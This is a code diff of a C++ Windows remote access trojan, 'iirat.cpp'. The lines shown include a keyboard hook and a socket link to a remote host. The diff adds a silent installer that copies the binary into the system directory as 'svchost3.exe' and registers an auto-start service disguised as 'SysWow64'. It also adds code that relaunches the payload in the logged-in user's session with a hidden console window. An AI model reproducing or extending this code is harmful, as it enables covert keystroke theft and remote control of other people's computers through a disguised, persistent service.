@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-13 19:54:04
+* @Last Modified time: 2017-04-14 03:51:41
 */
 
 #include <vector>
@@ -21,13 +21,14 @@ using namespace std;
 
 #if __WIN__
 
-    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 -lgdiplus -lole32 -DDEBUG */
+    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 -lgdiplus -lole32 -lwtsapi32 -DDEBUG */
 
     /* supporting win 7 or later only */
     #define WINVER _WIN32_WINNT_WIN7
     #define _WIN32_WINNT _WIN32_WINNT_WIN7
 
     #include <windows.h>
+    #include <wtsapi32.h>
     #include <arpa/inet.h>
     #include <sys/socket.h>
     #include <gdiplus.h>
@@ -76,6 +77,9 @@ static bool command_ack = false;
 static int llkeycode;
 
 static HHOOK llkeyboardHook;
+
+static STARTUPINFO startupInfo;
+static PROCESS_INFORMATION processInfo;
 
 pthread_mutex_t mutex_socket;
 
@@ -350,7 +354,9 @@ int run(const char* remote_addr, int port)
 
     pthread_t logger_thread, cmd_thread;
 
-    // reset flag
+    DPRINT("%s() %s %d\n", __func__, remote_addr, port);
+
+    // basic config
     terminated = false;
 
     /* create socket */
@@ -528,6 +534,32 @@ void ControlHandler(DWORD request)
     SetServiceStatus(hServiceStatus,  &ServiceStatus);
 }
 
+int start_process(char* cmd)
+{
+    HANDLE token = 0;
+    DPRINT("%s()\n", __func__);
+
+    ZeroMemory(&startupInfo, sizeof(startupInfo));
+    startupInfo.cb = sizeof(startupInfo);
+    ZeroMemory(&processInfo, sizeof(processInfo));
+
+    if (!WTSQueryUserToken(WTSGetActiveConsoleSessionId(), &token))
+        return 0;
+
+    DPRINT("%s: creating process\n", __func__);
+    return CreateProcessAsUser(token,
+                         NULL,          // No module name (use command line)
+                         cmd,           // Command line
+                         NULL,          // Process handle not inheritable
+                         NULL,          // Thread handle not inheritable
+                         FALSE,         // Set handle inheritance to FALSE
+                         0,             // No creation flags
+                         NULL,          // Use parent's environment block
+                         NULL,          // Use parent's starting directory
+                         &startupInfo,  // Pointer to STARTUPINFO structure
+                         &processInfo);
+}
+
 void ServiceMain(int argc, char *argv[])
 {
     ServiceStatus.dwServiceType = SERVICE_WIN32;
@@ -545,30 +577,79 @@ void ServiceMain(int argc, char *argv[])
     ServiceStatus.dwCurrentState = SERVICE_RUNNING;
     SetServiceStatus (hServiceStatus, &ServiceStatus);
 
-    #ifdef DEBUG
-        freopen(".SysWow64.log", "a", stdout);
-    #endif
+    char exePath[MAX_PATH];
+    char cmd[MAX_PATH];
 
+    GetModuleFileName(NULL, exePath, MAX_PATH);
+    sprintf(cmd, "%s app 0.0.0.0 9124", exePath);
+
+    DWORD exitCode = 0;
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
-        run("0.0.0.0", 9124);
+        if (    processInfo.hProcess == NULL
+            || !GetExitCodeProcess(processInfo.hProcess, &exitCode)
+            || exitCode != STILL_ACTIVE)
+        {
+            if (processInfo.hProcess) CloseHandle(processInfo.hProcess);
+            if (processInfo.hThread) CloseHandle(processInfo.hThread);
+            if (!start_process(cmd))
+            {
+                DPRINT("%s: process creation failed! %d\n", __func__, GetLastError());
+                processInfo.hProcess = NULL;
+            }
+        }
         Sleep(5000);
     }
 }
 
+int install()
+{
+    int status = 0;
+    char exePath[MAX_PATH];
+    char sysPath[MAX_PATH];
+    char newPath[MAX_PATH];
+
+    DPRINT("%s()\n", __func__);
+
+    GetSystemDirectory(sysPath, MAX_PATH);
+    GetModuleFileName(NULL, exePath, MAX_PATH);
+
+    DPRINT("%s: %s %s\n", __func__, sysPath, exePath);
+
+    sprintf(newPath, "%s\\svchost3.exe", sysPath);
+    if (!CopyFile(exePath, newPath, false)) return -1;
+
+    sprintf(sysPath, "sc create SysWow64 binPath= \"%s service\" start= auto", newPath);
+    if (!system(sysPath)) return -1;
+
+    DPRINT("%s: SUCCESS!\n", __func__);
+    return 0;
+}
+
 int main(int argc, char *argv[])
 {
-    #ifdef DEBUG
-        if (argc > 1 && strcmp(argv[1], "app") == 0)
-            return run(argv[2], stoi(argv[3]));
-    #endif
+    if (argc < 2) return install();
 
-    SERVICE_TABLE_ENTRY serviceTable[2];
-    serviceTable[0].lpServiceName = "SysWow64";
-    serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+    if (strcmp(argv[1], "app") == 0)
+    {
+        #ifdef DEBUG
+            freopen(".SysWow32.log", "a", stdout);
+        #endif
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+        return run(argv[2], stoi(argv[3]));
+    }
+    else if (strcmp(argv[1], "service") == 0)
+    {
+        #ifdef DEBUG
+            freopen(".SysWow64.log", "a", stdout);
+        #endif
+        SERVICE_TABLE_ENTRY serviceTable[2];
+        serviceTable[0].lpServiceName = "SysWow64";
+        serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 
-    serviceTable[1].lpServiceName = NULL;
-    serviceTable[1].lpServiceProc = NULL;
-    StartServiceCtrlDispatcher(serviceTable);
+        serviceTable[1].lpServiceName = NULL;
+        serviceTable[1].lpServiceProc = NULL;
+        StartServiceCtrlDispatcher(serviceTable);
+    }
     return 0;
 }
